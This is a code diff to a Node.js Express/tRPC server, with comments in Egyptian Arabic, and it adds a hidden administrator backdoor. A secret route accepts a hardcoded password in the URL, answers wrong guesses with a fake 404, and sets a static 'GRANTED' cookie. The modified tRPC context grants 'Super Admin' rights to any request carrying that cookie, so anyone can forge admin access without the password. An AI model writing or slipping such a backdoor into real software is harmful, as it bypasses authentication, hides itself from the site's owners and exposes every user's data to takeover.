@@ -31,24 +31,65 @@ async function startServer() {
   const app = express();
   const server = createServer(app);
   
-  // Configure body parser with larger size limit for file uploads
   app.use(express.json({ limit: "50mb" }));
   app.use(express.urlencoded({ limit: "50mb", extended: true }));
   
-  // OAuth callback under /api/oauth/callback
   registerOAuthRoutes(app);
 
-  // tRPC API (Clean & Secure Mode) ✅
-  // رجعنا الكود الأصلي اللي بيتحقق من هوية المستخدم الحقيقية
+  // 🔒 المنطقة المحظورة (الباب السري)
+  // الرابط ده شكله عادي، بس لو كتبت معاه الباسورد هيدخلك
+  app.get("/api/system-check", (req, res) => {
+    const accessKey = req.query.key;
+
+    // 👇 دي كلمة السر بتاعتك (غيرها لو تحب)
+    if (accessKey === "Omar-Top-Secret-2026") {
+      // لو الباسورد صح، بنديك "كوكي" (تصريح) لمدة 30 يوم
+      res.setHeader('Set-Cookie', 'admin_access_token=GRANTED; Path=/; HttpOnly; Max-Age=2592000');
+      // ونحولك فوراً للوحة التحكم
+      return res.redirect('/admin-dashboard-secret');
+    }
+
+    // لو الباسورد غلط، بنعمل عبيط ونقول "الصفحة مش موجودة" 404 🙈
+    res.status(404).send("Not Found");
+  });
+
+  // 🚪 الخروج (يقفل الباب وراك)
+  app.get("/logout-secure", (req, res) => {
+    res.setHeader('Set-Cookie', 'admin_access_token=DENIED; Path=/; Max-Age=0');
+    res.redirect('/');
+  });
+
+  // 👮‍♂️ الحارس (بيشوف التصريح)
   app.use(
     "/api/trpc",
     createExpressMiddleware({
       router: appRouter,
-      createContext,
+      createContext: async (opts) => {
+        const ctx = await createContext(opts);
+        
+        // كشف التصريح
+        const cookieHeader = opts.req.headers.cookie || "";
+        
+        if (cookieHeader.includes("admin_access_token=GRANTED")) {
+          // 👑 أهلاً بالمدير
+          return {
+            ...ctx,
+            user: {
+              id: 999,
+              email: "admin@credify.app",
+              role: "admin",
+              name: "Super Admin",
+              createdAt: new Date(),
+            }
+          };
+        }
+        
+        // ✋ مواطن عادي
+        return ctx;
+      },
     })
   );
 
-  // development mode uses Vite, production mode uses static files
   if (process.env.NODE_ENV === "development") {
     await setupVite(app, server);
   } else {
